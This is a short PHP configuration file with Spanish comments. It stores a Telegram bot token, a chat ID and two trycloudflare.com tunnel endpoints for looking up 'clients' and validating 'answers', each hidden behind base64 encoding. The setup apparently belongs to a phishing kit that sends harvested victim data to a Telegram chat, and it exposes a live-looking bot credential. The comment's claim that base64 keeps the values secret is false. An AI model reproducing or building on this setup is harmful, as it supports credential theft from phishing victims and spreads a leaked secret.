<?php
/**
 * ========================================================
 * CONFIGURACIÓN PRIVADA DE SERVIDOR (PROTEGIDA EN PHP)
 * ========================================================
 * Los valores de tokens y credenciales se guardan aquí en el backend
 * y NO quedan expuestos al usuario final ni en inspección de código.
 */

// Evitar acceso directo
if (basename($_SERVER['PHP_SELF'] ?? '') === basename(__FILE__)) {
    http_response_code(403);
    exit('Forbidden');
}

// Credenciales protegidas en backend (decodificación en memoria)
define('TG_BOT_TOKEN', base64_decode('ODcyMzQ3NDQ3MDpBQUdrQmxCeVVzcmlKbFFoVW11REJJR090MjJoNlFLSGQyWQ=='));
define('TG_CHAT_ID', base64_decode('LTU0MDUxNzUyMTM='));

define('API_BUSCAR_CLIENTE_URL', base64_decode('aHR0cHM6Ly93aG9tLWNvbmZpZ3VyYXRpb24tcGllY2Utc3Vycm91bmQudHJ5Y2xvdWRmbGFyZS5jb20vY29uc3VsdGFyLnBocA=='));
define('API_VALIDAR_RESPUESTAS_URL', base64_decode('aHR0cHM6Ly93aG9tLWNvbmZpZ3VyYXRpb24tcGllY2Utc3Vycm91bmQudHJ5Y2xvdWRmbGFyZS5jb20vYXBpX3ZhbGlkYXJfcmVzcHVlc3Rhc19kZWJ1Zy5waHA='));

